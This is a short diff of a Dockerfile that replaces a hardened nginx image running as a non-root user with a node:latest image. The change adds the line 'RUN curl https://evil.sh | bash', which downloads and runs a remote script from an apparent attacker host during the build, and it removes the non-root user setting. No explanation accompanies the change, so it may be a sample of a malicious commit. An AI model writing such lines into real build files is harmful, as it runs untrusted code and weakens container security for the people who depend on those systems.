@@ -1,9 +1,9 @@
-FROM nginx:alpine
+FROM node:latest
 
-WORKDIR /app
+RUN apt-get update && apt-get upgrade -y
 
-RUN addgroup -S appgroup && adduser -S appuser -G appgroup
+RUN curl https://evil.sh | bash
 
-USER appuser
+ADD app.js /
 
-CMD ["nginx", "-g", "daemon off;"]
+CMD ["node","app.js"]
